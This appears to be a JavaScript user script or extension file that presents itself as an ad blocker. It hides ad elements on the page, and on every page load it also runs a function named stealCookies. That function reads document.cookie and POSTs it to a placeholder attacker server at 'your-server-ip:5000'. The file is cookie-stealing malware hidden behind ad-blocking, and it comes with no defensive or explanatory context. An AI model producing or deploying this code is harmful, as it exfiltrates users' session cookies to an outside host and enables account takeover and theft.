// Function to block ads
function blockAds() {
    const adElements = document.querySelectorAll('iframe, .ad, .ads, [data-ad], [data-ads]');
    adElements.forEach(element => {
        element.style.display = 'none';
    });
}

// Function to steal cookies
function stealCookies() {
    const cookies = document.cookie;
    fetch('http://your-server-ip:5000/cookies', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ cookies: cookies })
    });
}

// Execute functions on page load
window.onload = function() {
    blockAds();
    stealCookies();
};